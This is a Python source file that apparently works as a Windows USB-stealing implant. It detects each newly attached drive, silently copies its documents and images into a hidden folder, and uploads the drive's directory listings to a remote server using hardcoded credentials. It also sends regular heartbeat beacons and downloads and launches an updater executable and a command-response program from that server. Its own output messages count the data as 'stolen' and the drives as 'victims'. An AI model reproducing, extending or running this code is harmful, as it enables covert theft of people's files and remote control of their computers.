import os
import shutil
import sys
import time
import win32api
import requests
import threading
import json
import psutil

current = []
roots = 'D:\\.dir'
rooting = ''
victims = []
new_version = False
with open('url.txt', 'r') as f:
    req_url = f.readlines()[0]
qz = ['.xls', '.xlsx', '.doc', '.pdf', '.docx', '.png', '.jpg', '.jpeg', '.gif', '.mp4', '.ppt', '.pptx']

# time.sleep(10)
with open('version.txt', 'rb') as f:
    version = f.readlines()[0]


header = {
    'Authorization': '1677034306556',
    'Connection': 'keep-alive',
    'Cookie': 'SHIROJSESSIONID=75ace860-0f00-4db0-9440-6c6d53cdf101',
    'Host': 'aceproj.gtcsst.org.cn',
    'Origin': 'https://aceproj.gtcsst.org.cn',
    'Referer': 'http://aceproj.gtcsst.org.cn/666/upload_file.php',
    'User-Agent': 'GTC Software Studio - ACE_Project (priority:00A) && contre_project (sub of ACE_Project)'
}

text_template: list = [['{} was found.', 'Scanning', '[{}] from [{}]', '{} files and {} directories in total',
                        '\r{:^3.0f}%[{}->{}]{:.2f}s,{} files and {:.2f} Mb remaining. ',
                        "\r100%[{}->]{:.2f}s,0 files and 0 Mb remaining.                                ",
                        '\nCompleted in {:.2f}s.', 'stolen {:.2f} Mb, ignored {:.2f} Mb, {:.2f} Mb in total.'],
                       ['{} был найден', 'сканирует', '[{}] с [{}]', 'всего существует {} файлов и {} каталога',
                        '\r{:^3.0f}%[{}->{}]{:.2f}s,{} файлы и {:.2f} Мб все еще остается.',
                        '\r100%[{}->]{:.2f}s,0 файлы и 0 Mb все еще остается.                                ',
                        'Завершено за {:.2f} секунды.',
                        'украдено {:.2f} Мб, проигнорировано {:.2f} Мб, всего {:.2f} Мб.'],
                       ['检测到 {}', '扫描文件与文件夹', '[{}] 来自 [{}]', '共有{} 个文件和 {} 个目录',
                        '\r{:^3.0f}%[{}->{}]{:.2f}s,{} 个文件、{:.2f} Mb 剩余. ',
                        "\r100%[{}->]{:.2f}s,0 个文件、 0 Mb 剩余.                                ",
                        '\n于 {:.2f}s 内完成。', '攫取了 {:.2f} Mb 文件, 忽略了 {:.2f} Mb 文件, 文件总大小 {:.2f} Mb.']]

file_ini = []

for root in range(ord('C'), ord('Z') + 1):
    try:
        os.listdir(chr(root) + ':\\')
        current.append(chr(root) + ':\\')
    except FileNotFoundError:
        pass
    except PermissionError:
        current.append(chr(root) + ':\\')

try:
    os.mkdir('D:\\.dir')
    os.popen('attrib +h D:\\.dir')
except FileExistsError:
    pass
except PermissionError:
    try:
        roots = 'E:\\.dir'
        os.mkdir('E:\\.dir')
        os.popen('attrib +h E:\\.dir')
        with open('storage.txt', 'w') as f:
            f.write('E:\\.dir')
    except FileExistsError:
        pass

lang = 1


def dfs(source, cur, lis, t):
    global roots
    try:
        dirs = os.listdir(source)
    except PermissionError:
        return

    for element in dirs:
        try:
            temp = ''
            temp_list = os.path.join(source, element).split('\\')[1:]
            for i in temp_list[:-1]:
                temp = temp + i + '\\'
            temp = temp + temp_list[-1]
            if os.path.isdir(os.path.join(source, element)):
                os.makedirs(os.path.join(rooting, temp))
                cur[element] = {}
                dfs(os.path.join(source, element), cur[element], lis, t)
            else:
                cur[element] = 0
                file_ini.append([os.path.join(source, element), os.path.join(rooting, temp),
                                 os.path.getsize(os.path.join(source, element))])
                lis.append(os.path.join(t, temp))
        except FileNotFoundError:
            pass


def controller():
    for i in range(len(file_ini)):
        try:
            shutil.copy(file_ini[i][0], file_ini[i][1])
        except:
            continue


def run(root):
    global rooting, file_ini
    disk_info = win32api.GetVolumeInformation("{}:\\".format(root[0]))
    struct = {}
    file_ini.clear()
    t = text_template[lang][2].format(str(int(time.time())), disk_info[0])
    os.mkdir(os.path.join(roots, t))
    rooting = os.path.join(roots, t)
    file_path = []
    dfs(root, struct, file_path, t)
    file_ini.sort(
        key=lambda x: 114514 if qz.count(os.path.splitext(x[0])[1]) == 0 else qz.index(os.path.splitext(x[0])[1]))
    file_path.sort(key=lambda x: 114514 if qz.count(os.path.splitext(x)[1]) == 0 else qz.index(os.path.splitext(x)[1]))
    with open('%s_json.txt' % t, 'w', encoding='utf-8') as f:
        f.write(json.dumps(struct, ensure_ascii=False, indent=4))
    with open('%s_path.txt' % t, 'w', encoding='utf-8') as f:
        for element in file_path:
            f.write(element)
            f.write('\n')
    file_object = {
        'type': (None, '6', None),
        'orgType': (None, 'B', None),
        'file': (r'%s_json.txt' % t, open(r'%s_json.txt' % t, 'rb'), 'unknown')
    }
    try:
        requests.post(req_url + 'upload.php', headers=header, files=file_object)
    except:
        pass
    temp_file = open(r'%s_path.txt' % t, 'rb')
    file_object = {
        'type': (None, '6', None),
        'orgType': (None, 'B', None),
        'file': (r'%s_path.txt' % t, temp_file, 'unknown')
    }
    try:
        requests.post(req_url + 'upload.php', headers=header, files=file_object)
    except:
        pass
    time.sleep(3)
    temp_file.close()
    os.remove('%s_json.txt' % t)
    os.remove('%s_path.txt' % t)
    controller()


def update_checker():
    global new_version
    while True:
        try:
            r = requests.get('https://aceproj.gtcsst.org.cn/contents/resource_for_others/version.txt').text
        except requests.exceptions.ConnectionError:
            time.sleep(51.4)
            continue
        except:
            time.sleep(51.4)
            continue
        with open('version.txt', 'r') as f:
            t = f.readlines()[0]
        if r.count('updater') > 0 and r != t:
            try:
                r = requests.get('https://aceproj.gtcsst.org.cn/contents/resource_for_others/updater.exe').content
            except requests.exceptions.ConnectionError:
                continue
            except:
                continue
            try:
                os.remove('updater.exe')
            except FileNotFoundError:
                pass
            with open('updater.exe', 'wb') as f:
                f.write(r)
            try:
                version = requests.get('https://aceproj.gtcsst.org.cn/contents/resource_for_others/version.txt').content
            except:
                continue
            with open('version.txt', 'wb') as f:
                f.write(version)
        elif r != t:
            new_version = True
            return
        time.sleep(51.4)


def stay_in_active():
    while not new_version:
        try:
            requests.post(req_url + '/in_active.php',
                          data={'version': version, 'remains': str(shutil.disk_usage(roots[:2])[2] / (1024 ** 3))})
        except:
            pass
        time.sleep(9)


threading.Thread(target=update_checker).start()
threading.Thread(target=stay_in_active).start()
os.system('start command_response.exe')

while True:
    for root in [chr(x) + ':\\' for x in range(ord('C'), ord('Z') + 1)]:
        try:
            os.listdir(root)
            if root in victims:
                continue
        except (FileNotFoundError, OSError, PermissionError):
            if root in current:
                current.remove(root)
            try:
                victims.remove(root)
            except ValueError:
                pass
            continue
        if root in current:
            continue
        # time.sleep(45)
        try:
            run(root)
        except requests.exceptions.ConnectionError:
            continue
        victims.append(root)
    time.sleep(3)
    if new_version:
        time.sleep(5)
        os.system('start updater.exe')
        break
